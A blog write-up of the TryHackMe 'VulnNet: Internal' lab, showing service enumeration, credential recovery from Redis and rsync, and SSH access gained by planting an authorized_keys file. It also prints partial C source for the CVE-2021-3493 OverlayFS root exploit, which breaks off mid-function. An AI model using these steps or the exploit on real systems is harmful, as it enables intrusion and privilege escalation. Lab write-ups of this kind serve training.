<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TryHackMe Writeup — VulnNet Internal - Offens!ve Blogs - Sakibul Ali Khan</title><meta name="description" content="VulnNet: Internal is a Easy/Medium level Box. It includes enumerating different services and finding useful information to gain user access. For privilege escalation we have to&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-black.css"><script type="text/javascript" async src="https://www.googletagmanager.com/gtag/js?id=G-BG46SGW391"></script><script type="text/javascript">window.dataLayer = window.dataLayer || [];
				  function gtag(){dataLayer.push(arguments);}
				  gtag('js', new Date());
				  gtag('config', 'G-BG46SGW391' , { 'anonymize_ip': true });
				  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BG46SGW391"></script><script>window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BG46SGW391');</script><link rel="canonical" href="https://sakibulalikhan.pages.dev/tryhackme-writeup-vulnnet-internal.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.pages.dev/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.pages.dev/feed.json"><meta property="og:title" content="TryHackMe Writeup — VulnNet Internal"><meta property="og:image" content="https://sakibulalikhan.pages.dev/media/posts/1/maxresdefault-4012345193.jpg"><meta property="og:image:width" content="1280"><meta property="og:image:height" content="720"><meta property="og:site_name" content="Offens!ve Blogs - Sakibul Ali Khan"><meta property="og:description" content="VulnNet: Internal is a Easy/Medium level Box. It includes enumerating different services and finding useful information to gain user access. For privilege escalation we have to&hellip;"><meta property="og:url" content="https://sakibulalikhan.pages.dev/tryhackme-writeup-vulnnet-internal.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="TryHackMe Writeup — VulnNet Internal"><meta name="twitter:description" content="VulnNet: Internal is a Easy/Medium level Box. It includes enumerating different services and finding useful information to gain user access. For privilege escalation we have to&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.pages.dev/media/posts/1/maxresdefault-4012345193.jpg"><link rel="shortcut icon" href="https://sakibulalikhan.pages.dev/media/website/pen-tux.png" type="image/png"><link rel="preload" href="https://sakibulalikhan.pages.dev/assets/dynamic/fonts/montserrat/montserrat.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://sakibulalikhan.pages.dev/assets/dynamic/fonts/montserrat/montserrat-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/assets/css/style.css?v=8011cf3ca33d35666e8941368434767f"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.pages.dev/tryhackme-writeup-vulnnet-internal.html"},"headline":"TryHackMe Writeup — VulnNet Internal","datePublished":"2022-01-16T08:48+06:00","dateModified":"2024-11-30T23:44+06:00","image":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/posts/1/maxresdefault-4012345193.jpg","height":720,"width":1280},"description":"VulnNet: Internal is a Easy/Medium level Box. It includes enumerating different services and finding useful information to gain user access. For privilege escalation we have to&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.pages.dev/authors/sakibulalikhan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan","logo":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png","height":500,"width":500}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript><script type="text/javascript">(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "kza4v42pst");</script><style>.extlink::after {
				background-color: currentColor;
				content: "";
				display: inline-block;
				height: 16px; 
				margin-left: 5px;
				position: relative;
				top: 0px;
				width: 16px; 
			}
		.extlink.extlink-icon-5::after { mask-image: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' fill='none' stroke='%23000000' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' xmlns='http://www.w3.org/2000/svg'><path d='M22 12A10 10 0 1 1 12 2'/><path d='M22 2 12 12'/><path d='M16 2h6v6'/></svg>"); }</style></head><body class="post-template"><div class="container container--center"><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="sakibulalikhan" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script><script defer="defer" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "22757d4facf2459dbb19685ef5c4bae1"}'></script><header class="header"><div class="header__logo"><a class="logo" href="https://sakibulalikhan.pages.dev/"><img src="https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png" alt="Offens!ve Blogs - Sakibul Ali Khan" width="500" height="500"></a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.pages.dev/" target="_self">Home</a></li><li class="has-submenu"><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" target="_self" aria-haspopup="true">CTF Writeups</a><ul class="navbar__submenu level-2" aria-hidden="true"><li><a href="https://sakibulalikhan.pages.dev/tags/hackthebox/" title="HackTheBox" target="_self">HackTheBox</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/tryhackme/" title="TryHackMe" target="_self">TryHackMe</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/hackviser/" title="Hackviser" target="_self">Hackviser</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/ctftime/" title="CTFtime" target="_self">CTFtime</a></li></ul></li><li><a href="https://sakibulalikhan.pages.dev/about.html" title="About Me" target="_self">About</a></li><li><a href="https://docs.google.com/document/d/10NGJ-Hn7zm6TEEfJIg3K3gqg3wLZ-6BLT77npYOHm4k/edit" title="Sakibul Ali Khan - Resume" target="_blank" rel="Sakibul Ali Khan">Resume</a></li><li><a href="https://sakibulalikhan.pages.dev/contact.html" title="Contact" target="_self">Contact</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">TryHackMe Writeup — VulnNet Internal</h1><div class="post__meta"><time datetime="2022-01-16T08:48" class="post__date">Jan 16, 2022 </time><span class="post__author"><a href="https://sakibulalikhan.pages.dev/authors/sakibulalikhan/" class="feed__author">Sakibul Ali Khan</a></span></div><div class="post__tags"><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" class="invert">CTF Writeups</a> <a href="https://sakibulalikhan.pages.dev/tags/tryhackme/" class="invert">TryHackMe</a></div></header><figure class="post__image post__cover"><img src="https://sakibulalikhan.pages.dev/media/posts/1/maxresdefault-4012345193.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/1/responsive/maxresdefault-4012345193-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/1/responsive/maxresdefault-4012345193-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/1/responsive/maxresdefault-4012345193-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/1/responsive/maxresdefault-4012345193-lg.jpg 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="720" width="1280" alt="TryHackMe Writeup — VulnNet Internal"></figure><div class="post__entry"><div class="post__inner"><div class="post__entry"><p id="dc75" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">VulnNet: Internal</strong> is a Easy/Medium level Box. It includes enumerating different services and finding useful information to gain user access. For privilege escalation we have to use port forwarding to access TeamCity service and then we can run commands as root user.</p><p id="7e0a" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">TryHackMe Room Link: <a class="af rn" href="https://tryhackme.com/room/vulnnetinternal" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/vulnnetinternal</a></p><h4><strong>There are four flags that need to be submitted in order to complete the challenge:</strong></h4><ol><li>Service Flag</li><li>Internal Flag</li><li>User Flag</li><li>Root Flag</li></ol><h2>Enumeration</h2><p id="ac8b" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">We start the enumeration with a <code class="ff abm abn abo abp b">nmap</code> scan to look for open ports and running services</p><p id="08fc" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong>Nmap Scan</strong></p><pre class="language-bash line-numbers"><code>❯ nmap -A -vv 10.10.96.14 &gt;nmap

NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:08
Completed NSE at 07:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:08
Completed NSE at 07:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:08
Completed NSE at 07:08, 0.00s elapsed
Initiating Ping Scan at 07:08
Scanning 10.10.96.14 [2 ports]
Completed Ping Scan at 07:08, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:08
Completed Parallel DNS resolution of 1 host. at 07:08, 0.03s elapsed
Initiating Connect Scan at 07:08
Scanning 10.10.96.14 [1000 ports]
Discovered open port 139/tcp on 10.10.96.14
Discovered open port 111/tcp on 10.10.96.14
Discovered open port 22/tcp on 10.10.96.14
Discovered open port 445/tcp on 10.10.96.14
Discovered open port 2049/tcp on 10.10.96.14
Discovered open port 873/tcp on 10.10.96.14
Increasing send delay for 10.10.96.14 from 0 to 5 due to max_successful_tryno increase to 4
Completed Connect Scan at 07:09, 34.33s elapsed (1000 total ports)
Initiating Service scan at 07:09
Scanning 6 services on 10.10.96.14
Completed Service scan at 07:09, 11.66s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.96.14.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:09
Completed NSE at 07:09, 6.47s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:09
Completed NSE at 07:09, 0.43s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:09
Completed NSE at 07:09, 0.00s elapsed
Nmap scan report for 10.10.96.14
Host is up, received conn-refused (0.21s latency).
Scanned at 2022–01–15 07:08:47 EST for 53s
Not shown: 990 closed tcp ports (conn-refused)
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
| 256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
| 256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i
111/tcp open rpcbind syn-ack 2–4 (RPC #100000)
| rpcinfo: 
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4 111/tcp6 rpcbind
| 100000 3,4 111/udp6 rpcbind
| 100003 3 2049/udp nfs
| 100003 3 2049/udp6 nfs
| 100003 3,4 2049/tcp nfs
| 100003 3,4 2049/tcp6 nfs
| 100005 1,2,3 47846/udp6 mountd
| 100005 1,2,3 51893/tcp mountd
| 100005 1,2,3 52114/udp mountd
| 100005 1,2,3 54049/tcp6 mountd
| 100021 1,3,4 39323/udp nlockmgr
| 100021 1,3,4 41673/tcp nlockmgr
| 100021 1,3,4 41907/tcp6 nlockmgr
| 100021 1,3,4 59210/udp6 nlockmgr
| 100227 3 2049/tcp nfs_acl
| 100227 3 2049/tcp6 nfs_acl
| 100227 3 2049/udp nfs_acl
|_ 100227 3 2049/udp6 nfs_acl
139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open rsync syn-ack (protocol version 31)
1086/tcp filtered cplscrambler-lg no-response
2049/tcp open nfs_acl syn-ack 3 (RPC #100227)
3945/tcp filtered emcads no-response
9090/tcp filtered zeus-admin no-response
56738/tcp filtered unknown no-response
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: -6h20m03s, deviation: 34m38s, median: -6h00m03s
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
| VULNNET-INTERNA&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;
| VULNNET-INTERNA&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;
| VULNNET-INTERNA&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;
| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;
| WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;
| Statistics:
| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time: 
| date: 2022–01–15T06:09:31
|_ start_date: N/A
| smb2-security-mode: 
| 3.1.1: 
|_ Message signing enabled but not required
| smb-security-mode: 
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| p2p-conficker: 
| Checking for Conficker.C or higher…
| Check 1 (port 53408/tcp): CLEAN (Couldn't connect)
| Check 2 (port 34685/tcp): CLEAN (Couldn't connect)
| Check 3 (port 9485/udp): CLEAN (Failed to receive data)
| Check 4 (port 22333/udp): CLEAN (Failed to receive data)
|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
| Computer name: vulnnet-internal
| NetBIOS computer name: VULNNET-INTERNAL\x00
| Domain name: \x00
| FQDN: vulnnet-internal</code></pre><p id="d113" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">As you can see, multiple ports are open and different services are running on each port. First let’s enumerate the SMB shares using the following command:</p><pre class="language-bash line-numbers"><code>❯ smbmap -H 10.10.96.14
[+] Guest session   	IP: 10.10.96.14:445	Name: 10.10.96.14                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	shares                                            	READ ONLY	VulnNet Business Shares
	IPC$                                              	NO ACCESS	IPC Service (vulnnet-internal server (Samba, Ubuntu))</code></pre><h2 id="92aa" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">First Flag</h2><p id="3ca8" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Now let’s try anonymous access on SMB share “shares” using the following command.</p><pre class="language-bash line-numbers"><code>❯ smbclient //10.10.96.14/shares
Enter WORKGROUP\sak's password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls                                       
  temp                               
  data                               
smb: \&gt;</code></pre><p id="7cd5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We found three files in both temp and data directory and using the <code class="ff abm abn abo abp b">get</code> command we can download all the files in our local system. Just download all file and you got your first flag from those file.</p><blockquote><p id="87c2" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><em>Note: In one of the files we found our first flag. But the other two files didn’t have any useful information.</em></p></blockquote><h2 id="5133" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Second Flag</h2><p id="e4f1" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Looking at the NMAP service scan from earlier, I saw that port 2049 was open and noticed that there was a lot of output for port 111. I can see in the output for port 111, that the service <strong class="ly kz">NFS </strong>was present in the output. This indicates that I might be able to list and download (and maybe upload) files.</p><pre class="language-bash line-numbers"><code>❯ sudo showmount -e 10.10.96.14
[sudo] password for sak: 
Export list for 10.10.96.14:
/opt/conf *</code></pre><p id="4638" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to mount <code class="ff abm abn abo abp b">/opt/conf</code> in our local directory, and for that we need to create a mount point (directory) with the name mount0.</p><p id="3d88" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">While traversing different directories we found something interesting in the <code class="ff abm abn abo abp b">redis</code> directory , <code class="ff abm abn abo abp b">redis.conf</code> contains the password for <code class="ff abm abn abo abp b">redis</code>.<span id="1494" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph=""></span></p><pre class="language-bash line-numbers"><code>❯ cat redis.conf | grep "pass"
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth &lt;master-password&gt;
requirepass "B65Hx562F*****"
</code></pre><p id="ead5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can access <code class="ff abm abn abo abp b">redis</code> using <code class="ff abm abn abo abp b">redis-cli</code> utility using the following command:</p><pre class="language-bash line-numbers"><code>❯ redis-cli -h 10.10.96.14 -p 6379 -a "B65Hx562F****"
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.96.14:6379&gt;</code></pre><p id="b8f1" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong>In here -h (IP) &amp; -a(Password)</strong></p><p id="1543" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">To get all the keys in <code class="ff abm abn abo abp b">redis</code>, we can run the command <code class="ff abm abn abo abp b">KEYS *</code>.</p><pre class="language-bash line-numbers"><code>10.10.96.14:6379&gt; KEYS * 1) "int" 2) "internal flag" 3) "authlist" 4) "tmp" 5) "marketlist" 10.10.96.14:6379&gt;</code></pre><p id="c96e" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Our second flag is present in the file named <code class="ff abm abn abo abp b">internal flag</code> and we can read it using the command:</p><pre class="language-bash line-numbers"><code>GET "internal flag"</code></pre><h2 id="207d" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">User Flag</h2><p id="ce1d" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">To find the type of a key in redis we run the command “type &lt;key_name&gt;”</p><pre class="language-bash line-numbers"><code>10.10.96.14:6379&gt; type authlist
list</code></pre><p id="52c6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We found that <code class="ff abm abn abo abp b">authlist</code> is a list type key and to read it's value we can run the following command:<span id="fe66" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph=""><br></span></p><pre class="language-bash line-numbers"><code>10.10.96.14:6379&gt; lrange authlist 1 10
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4**************************"</code></pre><p id="c37e" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><em>In here we got four base64 message.</em></p><p id="1ef6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After decoding this base64 message, we found the credentials for rsync.</p><blockquote><p id="de66" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz"><em class="tu">N.B.</em></strong><em class="tu"> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers.</em></p></blockquote><p id="14c8" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Rsync, or Remote Sync, is a free command-line tool that lets you transfer files and directories to local and remote destinations. Rsync is used for mirroring, performing backups, or migrating data to other servers.</p><p id="fcfc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">To get name of all the files or directories we can use the following command:</p><pre class="language-bash line-numbers"><code>$rsync -av rsync://rsync-connect@10.10.96.14/files/sys-internal/
Password: 
receiving incremental file list
created directory /sys-internal/</code></pre><p id="04db" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After the command is executed, all the files will be copied in <strong class="ly kz">/sys-internal/</strong> directory in our local system and there we found the user flag.</p><p id="fe50" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><em>Or you also use this command.</em></p><pre class="language-bash line-numbers"><code>$ rsync rsync://rsync-connect@10.10.96.14/files/sys-internal/ user.txt .</code></pre><h2 id="3c26" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">User Shell Access</h2><p id="4212" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">While enumerating <code class="ff abm abn abo abp b">sys-internal</code> files and directories, we found <code class="ff abm abn abo abp b">.ssh</code> directory and we know that using <code class="ff abm abn abo abp b">rsync</code> we can upload files. So we upload our <code class="ff abm abn abo abp b">id_rsa.pub</code> to the <code class="ff abm abn abo abp b">.ssh</code> directory using the command shown below.</p><pre class="language-bash line-numbers"><code>❯ rsync /home/sak/.ssh/id_rsa.pub rsync://rsync-connect@10.10.96.14/files/sys-internal/.ssh/authorized_keys
Password:

sent 661 bytes  received 144 bytes  84.74 bytes/sec
total size is 565  speedup is 0.70</code></pre><p id="f459" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can easily get user shell access by using <code class="ff abm abn abo abp b">id_rsa</code> private key.</p><pre class="language-bash line-numbers"><code>❯ sudo ssh sys-internal@10.10.96.14 -i /home/sak/.ssh/id_rsa
[sudo] password for sak: .

sys-internal@vulnnet-internal:~$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)</code></pre><p id="88c3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we have a SSH access to the target machine.</p><h2 id="30e9" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Privilege Escalation</h2><p id="2259" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">In here I upload “linpias.sh” script to identify What type of command I can run. I find os vertion “ubuntu 18.4”. we all know it have</p><p id="b4ee" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">— OverlayFS PE <strong class="ly kz">Vulnerability.</strong></p><p id="801b" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Reference Link <a class="af rn" href="https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/" rel="noopener ugc nofollow" target="_blank">https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/</a></p><p id="eb20" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">CVE<em>— </em></strong>CVE-2021–3493</p><p id="283b" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, we can get root privilege by this <strong class="ly kz">Exploit-</strong></p><pre class="language-c line-numbers"><code>#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;err.h&gt;
#include &lt;errno.h&gt;
#include &lt;sched.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/mount.h&gt;

//#include &lt;attr/xattr.h&gt;
//#include &lt;sys/xattr.h&gt;
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd &gt; 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");

    xwritefile("/proc/self/setgroups", "deny");

    sprintf(buf, "0 %d 1", uid);
